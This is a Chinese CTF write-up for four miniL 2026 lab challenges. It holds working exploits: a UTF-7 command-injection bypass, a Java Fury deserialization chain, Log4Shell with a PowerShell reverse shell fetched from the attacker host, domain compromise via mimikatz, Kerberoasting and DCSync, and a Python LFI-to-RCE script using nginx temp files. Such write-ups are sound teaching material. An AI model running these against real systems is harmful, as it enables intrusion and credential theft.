https://copperkoi.cn/post/p_e7e55a5fbc52

<!-- CopperKoi -->

# EzPing

![](https://i.ibb.co/gbTJyBY2/2026-05-07-140803.png)

utf 7 bypass

`;cat /flag`

```
+ADs-+AGMAYQB0- /+AGYAbABhAGc-
```

# Ezff

apache fury unser，和 CB1 基本上一样，把 `TemplatesImpl` 换成了 `OgnlStack.getValue` 就行.

PriorityQueue -> BeanComparator -> property getter -> OgnlStack.getValue -> Ognl.getValue

这题和 ccb 一样不好 rce，但能用类似布尔盲注的方式猜 flag.

执行 `new java.util.Scanner(new java.io.File('/flag')).next().charAt(i)==X?1:null` 比较，错了就 null 导致 `fury.deserialize` 失败返回 no.

exp

```java
import com.feilong.lib.beanutils.BeanComparator;
import com.feilong.lib.collection4.comparators.ComparableComparator;
import com.feilong.lib.collection4.comparators.FixedOrderComparator;
import com.feilong.lib.excel.ognl.OgnlStack;
import com.feilong.lib.ognl.Ognl;
import java.io.OutputStream;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.Base64;
import java.util.Collections;
import java.util.Map;
import java.util.PriorityQueue;
import org.apache.fury.Fury;
import org.apache.fury.config.Language;

public class Exp {
    private static final String TEMPLATE = "miniL{????????-????-????-????-????????????}";
    private static final String HEX = "0123456789abcdef";
    private static final HttpClient CLIENT =
        HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(5)).build();

    private static URI url;
    private static Fury fury;

    public static void main(String[] args) throws Exception {
        if (args.length != 1) {
            System.exit(1);
        }
        url = URI.create(args[0]);
        fury = newFury();

        StringBuilder flag = new StringBuilder();
        for (int i = 0; i < TEMPLATE.length(); i++) {
            char c = TEMPLATE.charAt(i);
            c = c == '?' ? crack(i) : check(i, c) ? c : fail("fixed char failed at index " + i + ": " + c);
            flag.append(c);
            if (TEMPLATE.charAt(i) == '?') {
                System.out.println(flag);
            }
        }
        System.out.println(flag);
    }

    private static char crack(int index) throws Exception {
        for (int i = 0; i < HEX.length(); i++) {
            char c = HEX.charAt(i);
            if (check(index, c)) {
                return c;
            }
        }
        return fail("no match at index " + index);
    }

    private static boolean check(int index, char c) throws Exception {
        HttpRequest req =
            HttpRequest.newBuilder(url)
                .timeout(Duration.ofSeconds(8))
                .header("Content-Type", "application/x-www-form-urlencoded")
                .POST(HttpRequest.BodyPublishers.ofString("data=" + payload(index, c)))
                .build();
        HttpResponse<String> resp =
            CLIENT.send(req, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8));
        return resp.body().trim().equals("ok");
    }

    @SuppressWarnings({"rawtypes", "unchecked"})
    private static String payload(int index, char c) throws Exception {
        String expr =
            "new java.util.Scanner(new java.io.File('/flag')).next().charAt("
                + index
                + ")=="
                + (int) c
                + "?1:null";

        OgnlStack stack = new OgnlStack(null);
        set(stack, "context", Collections.emptyMap());
        set(stack, "stackList", Collections.singletonList(null));
        ((Map) get(stack, "expressionsMap")).put("x", Ognl.parseExpression(expr));

        FixedOrderComparator<Object> inert = new FixedOrderComparator<>();
        inert.add(stack);
        BeanComparator cmp = new BeanComparator(null, inert);
        PriorityQueue<Object> queue = new PriorityQueue<>(2, cmp);
        queue.add(stack);
        queue.add(stack);
        cmp.setProperty("value(x)");
        set(cmp, "comparator", ComparableComparator.INSTANCE);

        return Base64.getEncoder().withoutPadding().encodeToString(fury.serialize(queue));
    }

    private static Fury newFury() {
        PrintStream out = System.out;
        System.setOut(new PrintStream(OutputStream.nullOutputStream()));
        try {
            return Fury.builder()
                .withLanguage(Language.JAVA)
                .requireClassRegistration(false)
                .withRefTracking(true)
                .build();
        } finally {
            System.setOut(out);
        }
    }

    private static Object get(Object obj, String name) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        return f.get(obj);
    }

    private static void set(Object obj, String name, Object value) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }

    private static char fail(String msg) {
        throw new IllegalStateException(msg);
    }
}
```

# EzDomain

## 环境

```
WEB01:
  VMnet1: 10.9.21.0/24 内网
  VMnet8: 192.168.162.0/24 NAT
  入口 IP: 192.168.162.10

DC01:
  VMnet1: 10.9.21.0/24 内网
  
攻击机:
  Windows: 192.168.162.1
  Kali WSL 2
  WSL 2 与 Windows 采用 NAT 隔离，Windows 在 WSL 视角下的地址为 172.19.64.1
```

## flag01

nmap 扫端口转了一圈没发现怎么进，，，后来没招了发现 25565 有个 minecraft 1.12.2 是利用点.

CVE-2021-44228 log4shell 利用 [JNDIExploit-1.2-SNAPSHOT.jar](https://github.com/ugnoeyh/Log4shell_JNDIExploit) jndi reverse shell.

JNDIExploit-1.2-SNAPSHOT.jar 起服务.

```
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.162.1 -l 1389 -p 8888
```

192.168.162.1:8000/s 起 python server 准备 reverse shell 脚本，9001 nc 监听.

```powershell
$c=New-Object Net.Sockets.TCPClient('192.168.162.1',9001)
$s=$c.GetStream()
[byte[]]$b=0..65535|%{0}
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
  $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i)
  $r=(iex $d 2>&1 | Out-String)
  $p='PS '+(pwd).Path+'> '
  $o=([Text.Encoding]::ASCII).GetBytes($r+$p)
  $s.Write($o,0,$o.Length)
}
$c.Close()
```

![](https://i.ibb.co/XhJFwYG/2026-05-01-145930.png)

进服发 payload.

```
${jndi:ldap://192.168.162.1:1389/Basic/Command/Base64/cG93ZXJzaGVsbCAtdyBoIC1jICJpZXgoaXdyIGh0dHA6Ly8xOTIuMTY4LjE2Mi4xOjgwMDAvcyki}
```

实际上是 `powershell -w h -c "iex(iwr http://192.168.162.1:8000/s)"`.

getshell.

![](https://i.ibb.co/gMsjggnW/2026-05-01-145959.png)

![](https://i.ibb.co/gM2G5cVn/2026-05-01-154417.png)

`whoami /priv` 有 `SeImpersonatePrivilege` 且有 `Print Spooler`，直接 PrintSpoofer 提权拿下 system.

flag01 就在桌面，其实不提权也能拿.

![](https://i.ibb.co/pBQcZvvt/2026-05-01-150323.png)

## flag02

### 进域

mimikatz 读 lsa secrets.

![](https://i.ibb.co/XrHFhNGR/2026-05-01-161030.png)

也是呃直接拿下 `MINIL\sql_backup : 7cd4A7b@3F2dE0eb`.

反向 socks 进内网，我们的这个呃 Windows 环境也是十分的差劲，索性代理到 kali 好了.

Windows 起 chisel server.

```powershell
chisel server --reverse -p 8001
```

web01 chisel client 连

```powershell
Start-Process C:\Users\Public\chisel.exe -ArgumentList 'client 192.168.162.1:8001 R:0.0.0.0:1080:socks' -WindowStyle Hidden
```

wsl 写了一个配置方便 proxychains4 连.

```bash
printf 'strict_chain\nproxy_dns\n[ProxyList]\nsocks5 172.19.64.1 1080\n' > /tmp/pc.conf
```

`nltest /dsgetdc:minil.ctf` 得到 dc 10.9.21.53.

### 寻路

`bloodhound-python -u sql_backup -p '7cd4A7b@3F2dE0eb' -d minil.ctf -ns 10.9.21.53 -c All --zip` 拿下 bloodhound zip.

![](https://i.ibb.co/v4M154tf/2026-05-07-202703.png)

这里乍一看打不到 Administrator，实则我们在 cypher 跑 All Kerberoastable users 发现 svc_deploy 有 spn 可以 kerberoast，sql_backup 可以请求它的 tgs.

![](https://i.ibb.co/20PNfB12/2026-05-07-203204.png)

而 svc_deploy 又可以 backup_svc，backup_svc 又有 dcsync，也是呃直接拿下 dc.

### 拿下

sql_backup 请求 svc_deploy 的 tgs. `impacket-GetUserSPNs -dc-ip 10.9.21.53 'minil.ctf/sql_backup:7cd4A7b@3F2dE0eb' -request-user svc_deploy` 后爆 hash.

![](https://i.ibb.co/W4NfG8xL/2026-05-01-170657.png)

得到 `svc_deploy : Minilab#1`.

用 svc_deploy 改 backup_svc 密码.

![](https://i.ibb.co/1y3B6wr/2026-05-01-170919.png)

直接就是用 impacket 进行一个 dcsync 拿到域控.

![](https://i.ibb.co/vGjGS3j/2026-05-01-171114.png")

也是呃拿下 flag02

![](https://i.ibb.co/2GnfP3Y/2026-05-01-171318.png)

# Hdphp

https://copperkoi.cn/post/p_73d9a67c8daf

## intro

miniL 2026 Hdphp

```php
<?php
if (isset($_GET['f']) && !preg_match('/flag|file|php|data|zip|phar|(proc|dev|bin|usr|var).{15,}/i', $_GET['f'])) {
    usleep(200000);
    include $_GET['f'];
} else {
    highlight_file(__FILE__);
}
```

## nginx temp files

当请求体或上游响应大于内存缓冲区时，nginx 会将数据写入临时文件，保持 fd 打开，仅 unlink 掉文件名. 超出缓冲阈值的请求体会被刷新到 `client_body_temp_path`（默认是 `/tmp/nginx/client-body` 或 `/var/lib/nginx/body`）. 虽然文件名是随机的，但 fd 可通过 `/proc/<nginx_pid>/fd/<fd>` 访问.

因此只需要悬挂 tcp 流使得请求体未完成，fd 就会保持打开. 从而通过 lfi 配合 procfs 跳转执行已缓冲的临时文件.

## `/proc`

`/proc` 是一个伪文件系统，它提供了对许多 linux 内核数据结构的访问. linux 中的每个进程都有一个名为 `/proc/[pid]` 的目录供其使用. 该目录存储了大量关于进程的信息，包括程序启动时传递给它的参数、它可见的环境变量以及打开的文件描述符.

`/proc/[pid]/fd` 内的特殊文件描述了进程打开的 fd. 它们看起来像符号链接（symlink），你可以看到文件的原始路径，但它们并非严格意义上的符号链接. 即使原始路径无法访问，你也可以传递这些 fd，从而获得另一个可用的 fd.

`/proc/[pid]` 内还有一个名为 `exe` 的文件，它与 `/proc/[pid]/fd` 中的文件类似，只是它指向在该进程中执行的二进制程序.

`/proc/[pid]` 还有一个目录 `/proc/self`. 该目录与访问它的进程的目录相同.

## `procfs`

`procfs` 是一种特殊的 vfs，它可以挂载到目录树中，并且通常挂载在 `/proc`. 它允许用户空间中的进程读取内核信息或使用常规的文件 io 操作.

`ext4` 与 `procfs` 都存在 `vfs`，`vfs` 既能提供一致的 api，又能允许不同的实现方式在后台提供各自的功能，从而将读取的文件转换为内核内部方法.

## stat

`php_sys_lstat()` 实际上就是 linux 的 `lstat()`，这个函数是用来获取一些文件相关的信息，成功返回 0，失败返回 -1.

如果 `save && php_sys_lstat(path, &st) < 0`，且当前不是 `CWD_REALPATH`，php 不会立刻失败，而是 `save = 0`，并继续做展开，但不再走保存并解链接. 当 `save = 0` 时，后面会把原始未解析后缀直接拷回结果串，也就是保留字面路径而不是继续解目标.

`tsrm_realpath_r()` 对 `..` 的处理是纯词法弹栈，遇到 `..` 时，先递归处理前缀，再把前一个路径分量弹掉. 它不要求那个前一分量真的存在，也就是说我们即使写一个不存在的也不会影响后面的解析.

这一部分的源码依据主要在 `main/fopen_wrappers.c` `main/streams/plain_wrapper.c` `Zend/zend_virtual_cwd.h` `Zend/zend_virtual_cwd.c`.

## revisit

那么回到我们最初的题目.

[HackTricks](https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-nginx-temp-files.html) 有一个比较简洁的方法论，枚举工作进程 pid -> 强制 nginx 创建临时文件 -> 将 fd 映射到文件 -> 包含执行.

我们可以利用 `%0a` 换行绕过正则实现 `/proc` 长路径. 下面这种 include 路径可以把 deleted fd 当文件 `include`.

```
/proc/self/fd/<anchor>%0a/../../../<nginx_pid>/fd/<fd>
```

前面的 `/proc/self/fd/<anchor>\n/../../../` 是诱饵，是让 `lstat()` 失败防止直接 `readlink`，最后由内核按 procfd reopen.

```
include/file_get_contents
-> _php_stream_fopen()
-> expand_filepath()
-> expand_filepath_with_mode(..., CWD_FILEPATH)
-> virtual_file_ex()
-> tsrm_realpath_r()
-> open(realpath)
```

我们最耿直的 payload `/proc/<nginx_pid>/fd/<fd>` 直接 `readlink` 会走到已删掉的旧 pathname，但它已经 unlink 了所以根本读不到.

这里有一个优化的更简洁的 payload，原理是一样的. 只不过下面的 `copperkoi` 是不存在的，利用了 `tsrm_realpath_r()` 的 trick.

```
/proc/<nginx_pid>/fd/copperkoi/../<fd>
```

虽然这个 payload 没有用到 `%0a`，但我们可以利用 `%0a` 读长路径，通过 `/proc/self/fd/0%0a/../../../1/task/1/children` 读到

```
8 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26
```

其中 8 是 php-fpm master，[11,26] 是 nginx worker. 不过这个其实可以通过 burp 爆出来.

枚举 fd 也有一些小技巧，经反复测试真正的 body temp regular file 往往有 `flags: 0100002`.

exp

```python
#!/usr/bin/env python3
import random
import re
import socket
import string
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

import requests


BEGIN = "___BEGIN_FLAG___"
END = "___END_FLAG___"
FLAG_RE = re.compile(r"miniL\{[0-9a-f]{8}(?:-[0-9a-f]{4}){3}-[0-9a-f]{12}\}")


def rs(n: int = 6) -> str:
    return "".join(random.choice(string.ascii_letters) for _ in range(n))


def make_body() -> bytes:
    php = (
        b"\n<?php "
        b"echo '" + BEGIN.encode() + b"';"
        b"@readfile('/f'.'lag');"
        b"@readfile('/f'.'lag.txt');"
        b"echo '" + END.encode() + b"';"
        b"exit;"
        b"?>\n"
    )
    return (b"A" * 4096 + php) * 120


class Exp:
    def __init__(self, target: str):
        u = urlparse(target.rstrip("/"))
        self.url = target.rstrip("/")
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or (443 if u.scheme == "https" else 80)
        self.path = u.path or "/"
        self.body = make_body()
        self.total = 900 * 1024
        self.stop = threading.Event()
        self.holders = []

    def get(self, path: str, timeout: float = 3.0) -> str:
        try:
            return requests.get(self.url, params={"f": path, "_": rs()}, timeout=timeout).text
        except Exception:
            return ""

    def workers(self) -> list[int]:
        out = []
        text = self.get("/proc/self/fd/0\n/../../../1/task/1/children", 4.0)
        for x in text.split():
            if not x.isdigit():
                continue
            pid = int(x)
            cmd = self.get(f"/proc/{pid}/cmdline", 2.0).replace("\x00", " ")
            if "nginx: worker process" in cmd:
                out.append(pid)
        return out

    def snap(self, pids: list[int], lo: int = 20, hi: int = 40) -> dict[tuple[int, int], str]:
        out = {}
        with ThreadPoolExecutor(max_workers=48) as ex:
            fut = {
                ex.submit(self.get, f"/proc/{pid}/fdinfo/{fd}", 2.0): (pid, fd)
                for pid in pids
                for fd in range(lo, hi + 1)
            }
            for f in as_completed(fut):
                pid, fd = fut[f]
                text = f.result()
                if "pos:" in text and "mnt_id:" in text:
                    out[(pid, fd)] = " ".join(text.split())
        return out

    def hold(self, n: int = 6) -> None:
        for i in range(n):
            s = socket.create_connection((self.host, self.port), timeout=3)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.sendall(
                (
                    f"GET {self.path}?hold={i} HTTP/1.1\r\n"
                    f"Host: {self.host}:{self.port}\r\n"
                    "Connection: close\r\n"
                    "Content-Type: application/octet-stream\r\n"
                    f"Content-Length: {self.total}\r\n\r\n"
                ).encode()
            )
            s.sendall(self.body)
            self.holders.append(s)

            def drip(sock: socket.socket) -> None:
                while not self.stop.is_set():
                    try:
                        sock.sendall(b"B" * 512)
                    except Exception:
                        break
                    time.sleep(0.1)

            threading.Thread(target=drip, args=(s,), daemon=True).start()

    def close(self) -> None:
        self.stop.set()
        for s in self.holders:
            try:
                s.close()
            except Exception:
                pass

    def include_fd(self, pid: int, fd: int) -> str:
        for anchor in ("0", str(pid)):
            path = f"/proc/self/fd/{anchor}\n/../../../{pid}/fd/{fd}"
            text = self.get(path, 8.0)
            if BEGIN in text or FLAG_RE.search(text):
                return text
        return ""

    def run(self) -> str:
        pids = self.workers()
        if not pids:
            raise RuntimeError("no nginx worker found")
        print(f"[+] workers = {pids}")

        base = self.snap(pids)
        self.hold()
        time.sleep(0.8)
        cur = self.snap(pids)

        cand = []
        for key, info in sorted(cur.items()):
            if base.get(key) == info:
                continue
            if "0100002" in info:
                cand.insert(0, key)
            elif "eventfd" not in info and "scm_fds:" not in info:
                cand.append(key)
        print(f"[+] candidates = {cand}")

        for pid, fd in cand:
            text = self.include_fd(pid, fd)
            if not text:
                continue
            if BEGIN in text and END in text:
                mid = text.split(BEGIN, 1)[1].split(END, 1)[0]
                m = FLAG_RE.search(mid) or FLAG_RE.search(text)
                return m.group(0) if m else mid.strip()
            m = FLAG_RE.search(text)
            if m:
                return m.group(0)
        raise RuntimeError("flag not found")


def main() -> None:
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} http://127.0.0.1:PORT/")
        raise SystemExit(1)
    exp = Exp(sys.argv[1])
    try:
        print(f"[+] flag = {exp.run()}")
    finally:
        exp.close()


if __name__ == "__main__":
    main()

```

## references

https://ops.tips/blog/what-is-slash-proc/

https://aws.amazon.com/cn/blogs/compute/anatomy-of-cve-2019-5736-a-runc-container-escape/

https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-nginx-temp-files.html

https://bierbaumer.net/security/php-lfi-with-nginx-assistance/

https://www.anquanke.com/post/id/213235

https://www.anquanke.com/post/id/241808

https://goodapple.top/archives/968

https://xz.aliyun.com/news/10521

https://www.cnblogs.com/justdoIT20680/p/18777799

https://cloud.tencent.com/developer/article/1925240

https://nvd.nist.gov/vuln/detail/CVE-2025-1974

https://copperkoi.cn/post/p_2252c064c6d1#staircase

https://hacktricks.xsx.tw/pentesting-web/file-inclusion/lfi2rce-via-nginx-temp-files

https://loong716.top/posts/File_Inclusion/#0x03-bypass

https://to016.github.io/posts/PHPLFI2RCE/

https://man7.org/linux/man-pages/man5/proc.5.html

https://man7.org/linux/man-pages/man5/proc_pid_fd.5.html

https://sources.debian.org/src/tar/1.34%2Bdfsg-1.2%2Bdeb12u1/gnu/openat-proc.c/

是的，上面这些我全看了，这是或多或少有点参考或有帮助的. 还有很多没帮助的我就不列在这里了.